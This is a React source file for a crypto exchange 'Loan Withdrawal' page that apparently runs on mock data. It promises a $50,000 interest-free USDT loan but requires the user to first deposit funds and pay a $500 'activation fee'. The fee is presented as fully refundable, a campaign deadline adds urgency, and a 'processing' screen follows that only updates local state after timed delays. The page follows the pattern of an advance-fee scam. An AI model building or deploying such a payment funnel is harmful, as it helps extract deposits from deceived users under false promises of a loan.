"use client";
import { useState } from "react";
import {
  ArrowUpRight, Shield, CheckCircle, Clock, AlertCircle,
  RefreshCw, Wallet, ChevronRight, Info, ExternalLink, Copy, Check
} from "lucide-react";
import { useStore } from "@/lib/store";
import { CAMPAIGN_STATS } from "@/lib/mock-data";
import { toast } from "sonner";

type Step = "overview" | "pay-fee" | "confirm-address" | "submitted";

export default function WithdrawPage() {
  const { demoUser, walletBalances, payActivationFee, requestActivationRefund, initiateExternalWithdrawal } = useStore();
  const [step, setStep] = useState<Step>("overview");
  const [externalAddress, setExternalAddress] = useState("");
  const [payAsset, setPayAsset] = useState("USDT");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [refundLoading, setRefundLoading] = useState(false);

  const usdtBal = walletBalances.USDT?.available ?? 0;
  const feeAmount = CAMPAIGN_STATS.activationFeeUSD;
  const canAffordFee = usdtBal >= feeAmount;

  const handlePayFee = async () => {
    if (!canAffordFee) { toast.error("Insufficient USDT balance — please deposit first"); return; }
    setLoading(true);
    await new Promise(r => setTimeout(r, 1500));
    payActivationFee("USDT");
    setLoading(false);
    toast.success("Loan Activation Fee paid successfully");
    setStep("confirm-address");
  };

  const handleSubmitWithdrawal = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!externalAddress.trim()) { toast.error("Please enter your wallet address"); return; }
    if (externalAddress.trim().length < 25) { toast.error("Invalid wallet address"); return; }
    setLoading(true);
    await new Promise(r => setTimeout(r, 2000));
    initiateExternalWithdrawal(externalAddress.trim());
    setLoading(false);
    setStep("submitted");
    toast.success("Withdrawal request submitted — processing 24-72 hours");
  };

  const handleRefund = async () => {
    setRefundLoading(true);
    await new Promise(r => setTimeout(r, 1200));
    requestActivationRefund();
    setRefundLoading(false);
    toast.success("$500 USDT refunded to your wallet");
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(externalAddress || "No address entered yet");
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  // ── SUBMITTED state ──
  if (step === "submitted" || demoUser.loanWithdrawnToExternal) {
    return (
      <div className="p-6 max-w-xl">
        <div className="bg-ex-card border border-ex-border rounded-2xl p-8 text-center">
          <div className="w-16 h-16 bg-ex-green/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle className="w-8 h-8 text-ex-green" />
          </div>
          <h2 className="text-2xl font-black mb-2">Withdrawal Submitted</h2>
          <p className="text-gray-400 mb-6">Your $50,000 USDT withdrawal is being processed.</p>

          <div className="bg-ex-card2 border border-ex-border rounded-xl p-4 text-left space-y-3 mb-6 text-sm">
            {[
              { label: "Amount",        value: "50,000 USDT" },
              { label: "Status",        value: "Processing", cls: "text-ex-yellow" },
              { label: "Est. Delivery", value: "24–72 hours" },
              { label: "Network",       value: "USDT (TRC-20 / ERC-20)" },
            ].map(r => (
              <div key={r.label} className="flex justify-between">
                <span className="text-gray-500">{r.label}</span>
                <span className={`font-semibold ${r.cls ?? ""}`}>{r.value}</span>
              </div>
            ))}
          </div>

          <div className="flex items-start gap-3 bg-ex-card2 border border-ex-border rounded-xl p-4 text-left text-sm text-gray-400">
            <Info className="w-4 h-4 mt-0.5 shrink-0 text-ex-blue" />
            <p>Our team verifies each withdrawal request for security compliance. You will receive a confirmation once processing is complete.</p>
          </div>
        </div>
      </div>
    );
  }

  // ── OVERVIEW ──
  return (
    <div className="p-6 max-w-2xl">
      <h1 className="text-3xl font-black mb-1">Loan Withdrawal</h1>
      <p className="text-gray-400 mb-6">Transfer your $50,000 USDT loan to your external wallet</p>

      {/* Status card */}
      <div className="bg-ex-card border border-ex-border rounded-2xl p-5 mb-5">
        <div className="flex items-center justify-between mb-4">
          <h2 className="font-bold">Your Loan Status</h2>
          <span className={`text-xs font-semibold px-3 py-1 rounded-full border ${
            demoUser.loanStatus === "approved"
              ? "text-ex-green bg-ex-green/10 border-ex-green/30"
              : "text-ex-yellow bg-ex-yellow/10 border-ex-yellow/30"
          }`}>
            {demoUser.loanStatus === "approved" ? "✓ Approved" : demoUser.loanStatus}
          </span>
        </div>

        <div className="grid grid-cols-2 gap-3 text-sm">
          {[
            { label: "Loan Amount",     value: "$50,000 USDT" },
            { label: "Interest Rate",   value: "0% — Interest Free" },
            { label: "Campaign Deadline", value: "December 31, 2026" },
            { label: "KYC Status",      value: demoUser.kycStatus === "approved" ? "✓ Verified" : demoUser.kycStatus },
          ].map(r => (
            <div key={r.label} className="bg-ex-card2 border border-ex-border rounded-xl p-3">
              <div className="text-gray-500 text-xs">{r.label}</div>
              <div className="font-semibold mt-1">{r.value}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Wallet balance */}
      <div className="bg-ex-card border border-ex-border rounded-2xl p-5 mb-5">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-ex-green/10 rounded-xl flex items-center justify-center">
              <Wallet className="w-5 h-5 text-ex-green" />
            </div>
            <div>
              <div className="text-sm text-gray-400">Your USDT Balance</div>
              <div className="text-2xl font-black font-num">{usdtBal.toLocaleString("en-US", { maximumFractionDigits: 2 })} USDT</div>
            </div>
          </div>
          <a href="/wallet" className="text-xs text-ex-yellow hover:underline flex items-center gap-1">
            Deposit <ExternalLink className="w-3 h-3" />
          </a>
        </div>
      </div>

      {/* Activation Fee section */}
      <div className="bg-ex-card border border-ex-border rounded-2xl overflow-hidden mb-5">
        <div className="p-5 border-b border-ex-border flex items-center gap-3">
          <div className="w-10 h-10 bg-ex-yellow/10 rounded-xl flex items-center justify-center">
            <Shield className="w-5 h-5 text-ex-yellow" />
          </div>
          <div>
            <h2 className="font-bold">Loan Activation Fee</h2>
            <p className="text-xs text-gray-400">One-time platform processing & compliance charge</p>
          </div>
        </div>

        <div className="p-5">
          {/* Fee details */}
          <div className="space-y-3 mb-5">
            {[
              { label: "Activation Fee",   value: `$${feeAmount} USDT` },
              { label: "Type",             value: "One-time, non-recurring" },
              { label: "Purpose",          value: "Platform KYC compliance & processing" },
              { label: "Refundable Until", value: "December 31, 2026" },
            ].map(r => (
              <div key={r.label} className="flex justify-between text-sm">
                <span className="text-gray-400">{r.label}</span>
                <span className="font-semibold">{r.value}</span>
              </div>
            ))}
          </div>

          {/* Refund policy notice */}
          <div className="bg-ex-green/5 border border-ex-green/20 rounded-xl p-4 mb-5">
            <div className="flex items-start gap-2 text-sm">
              <RefreshCw className="w-4 h-4 text-ex-green mt-0.5 shrink-0" />
              <div>
                <span className="text-ex-green font-semibold">Fully Refundable</span>
                <span className="text-gray-400"> — If you choose not to proceed with the loan withdrawal, the $500 USDT activation fee is fully refundable before December 31, 2026.</span>
              </div>
            </div>
          </div>

          {/* Action area */}
          {!demoUser.activationFeePaid ? (
            <div>
              {!canAffordFee ? (
                <div className="mb-4 bg-ex-yellow/5 border border-ex-yellow/20 rounded-xl p-4 flex items-start gap-3 text-sm">
                  <AlertCircle className="w-4 h-4 text-ex-yellow mt-0.5 shrink-0" />
                  <div>
                    <span className="text-ex-yellow font-semibold">Insufficient balance.</span>
                    <span className="text-gray-400"> Please deposit at least ${feeAmount} USDT to your wallet first, then return here to pay the activation fee.</span>
                  </div>
                </div>
              ) : null}

              <div className="flex gap-3">
                <button
                  onClick={handlePayFee}
                  disabled={loading || !canAffordFee}
                  className="btn-primary flex-1 py-3 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
                  {loading ? (
                    <><RefreshCw className="w-4 h-4 animate-spin" /> Processing...</>
                  ) : (
                    <><Shield className="w-4 h-4" /> Pay ${feeAmount} Activation Fee</>
                  )}
                </button>

                {!canAffordFee && (
                  <a href="/wallet"
                    className="btn-outline px-4 py-3 flex items-center gap-2 whitespace-nowrap text-sm font-semibold">
                    <Wallet className="w-4 h-4" /> Deposit USDT
                  </a>
                )}
              </div>
            </div>
          ) : (
            <div>
              {/* Fee paid — refund or continue */}
              <div className="bg-ex-green/10 border border-ex-green/30 rounded-xl p-3 flex items-center gap-2 mb-4 text-sm text-ex-green font-semibold">
                <CheckCircle className="w-4 h-4" /> Activation fee paid successfully
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => setStep("confirm-address")}
                  className="btn-primary flex-1 py-3 flex items-center justify-center gap-2">
                  Continue to Withdrawal <ChevronRight className="w-4 h-4" />
                </button>
                <button
                  onClick={handleRefund}
                  disabled={refundLoading || demoUser.activationFeeRefundRequested}
                  className="btn-outline px-4 py-3 text-sm font-semibold flex items-center gap-2 whitespace-nowrap">
                  {refundLoading ? (
                    <><RefreshCw className="w-4 h-4 animate-spin" /> Refunding...</>
                  ) : demoUser.activationFeeRefundRequested ? (
                    "Refunded"
                  ) : (
                    <><RefreshCw className="w-4 h-4" /> Request Refund</>
                  )}
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Process steps */}
      <div className="bg-ex-card border border-ex-border rounded-2xl p-5">
        <h3 className="font-bold mb-4">Withdrawal Process</h3>
        <div className="space-y-3">
          {[
            {
              n: 1,
              title: "Pay Activation Fee",
              desc: "One-time $500 USDT compliance & processing charge",
              done: demoUser.activationFeePaid,
            },
            {
              n: 2,
              title: "Confirm Destination Address",
              desc: "Provide your external USDT wallet address",
              done: false,
            },
            {
              n: 3,
              title: "Processing",
              desc: "Our team processes and verifies the withdrawal",
              done: false,
            },
            {
              n: 4,
              title: "Funds Delivered",
              desc: "50,000 USDT arrives in your external wallet within 24-72h",
              done: false,
            },
          ].map((s, i) => (
            <div key={i} className="flex items-start gap-3">
              <div className={`w-7 h-7 rounded-full flex items-center justify-center shrink-0 text-xs font-bold border ${
                s.done
                  ? "bg-ex-green/10 border-ex-green/40 text-ex-green"
                  : "bg-ex-card2 border-ex-border text-gray-400"
              }`}>
                {s.done ? <CheckCircle className="w-3.5 h-3.5" /> : s.n}
              </div>
              <div>
                <div className="text-sm font-semibold">{s.title}</div>
                <div className="text-xs text-gray-500">{s.desc}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ── CONFIRM ADDRESS MODAL ── */}
      {step === "confirm-address" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
          <div className="bg-ex-card border border-ex-border rounded-2xl w-full max-w-md p-6 shadow-2xl">
            <h3 className="text-xl font-black mb-1">Confirm Withdrawal Address</h3>
            <p className="text-gray-400 text-sm mb-5">Enter the external wallet address to receive 50,000 USDT</p>

            <form onSubmit={handleSubmitWithdrawal} className="space-y-4">
              <div>
                <label className="text-sm text-gray-400 block mb-1.5">Your USDT Wallet Address *</label>
                <input
                  className="ex-input font-mono text-sm"
                  type="text"
                  required
                  placeholder="e.g. TRx... or 0x..."
                  value={externalAddress}
                  onChange={e => setExternalAddress(e.target.value)}
                />
                <p className="text-xs text-gray-500 mt-1.5">Accepts TRC-20 (Tron) or ERC-20 (Ethereum) USDT addresses</p>
              </div>

              <div className="bg-ex-card2 border border-ex-border rounded-xl p-3 text-sm space-y-2">
                <div className="flex justify-between">
                  <span className="text-gray-500">Withdrawal Amount</span>
                  <span className="font-semibold">50,000 USDT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Network Fee</span>
                  <span className="text-gray-300">1 USDT</span>
                </div>
                <div className="flex justify-between font-bold border-t border-ex-border pt-2 mt-1">
                  <span>You Receive</span>
                  <span className="text-ex-green">49,999 USDT</span>
                </div>
              </div>

              <div className="flex items-center gap-2 text-xs text-gray-500">
                <Clock className="w-3.5 h-3.5" /> Processing time: 24–72 hours after submission
              </div>

              <div className="flex gap-3 pt-1">
                <button type="button" onClick={() => setStep("overview")}
                  className="btn-outline flex-1 py-3 text-sm font-semibold">
                  Back
                </button>
                <button type="submit" disabled={loading}
                  className="btn-primary flex-1 py-3 flex items-center justify-center gap-2">
                  {loading ? (
                    <><RefreshCw className="w-4 h-4 animate-spin" /> Submitting...</>
                  ) : (
                    <>Submit Withdrawal <ArrowUpRight className="w-4 h-4" /></>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
